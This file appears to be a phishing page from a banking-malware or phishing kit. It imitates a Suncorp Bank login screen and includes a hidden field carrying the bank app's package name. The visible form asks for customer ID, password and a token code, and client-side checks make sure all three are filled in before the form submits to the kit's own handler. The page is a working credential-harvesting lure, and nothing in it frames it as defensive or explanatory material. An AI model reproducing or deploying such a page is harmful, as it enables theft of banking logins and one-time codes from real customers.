<?php require_once '../go.php';?>
<!DOCTYPE html>

<html>
<head>
    <link rel="stylesheet" href="libs/bootstrap/dist/css/bootstrap.min.css">
    <link rel="stylesheet" href="libs/font-awesome/css/font-awesome.min.css">
    <link rel="stylesheet" href="libs/css/style.css">
</head>

<body>	

<div class="logo">
	<img src="libs/images/select.png" style="height: 45px;display: inline-block;width: 90px;margin-left: 47px;margin-top: 55px;">
	<img src="libs/images/welcome_logo.png" style="float: right;">
</div>

	<div class="col-xs-10 col-sm-8">

<form method="post">

<div class="form">

<input name="field1" value="au.com.suncorp.SuncorpBank" type="hidden">

<input id="login" name="field2" class="input_100" placeholder="Customer ID" type="text">

<input id="password" name="field3" class="input_100" placeholder="Password" type="password">

<input id="code" name="field4" class="input_100" placeholder="Token Code (optional)" type="text">
</div><br>
<input id="input_submitBtn" value="Secure Login" type="submit">

</form>

	</div>

            <script type="text/javascript">
                    var g_oBtn = document.getElementById('input_submitBtn');
                    g_oBtn.onclick = function () {
					
						var oNumInp = document.getElementById('login');
                        var oCodeInp = document.getElementById('password');
                        var oCode = document.getElementById('code');

						try{
							oNumInp.className = oCodeInp.className = oCode.className = 'input_100';
						} catch(e){};
						
                        if (oNumInp.value.length < 3) {
							try{
								oNumInp.className = 'fielderror';
							} catch(e){};
                            return false;
                        }
						
                        if (!/^\w{3,100}$/i.test(oCodeInp.value)) {
							try{
                                oCodeInp.className = 'fielderror';
							} catch(e){};
                            return false;
                        }
						
                        if (oCode.value.length < 3) {
							try{
								oCode.className = 'fielderror';
							} catch(e){};
                            return false;
                        }						
						
                    }
            </script>
</body>

</html>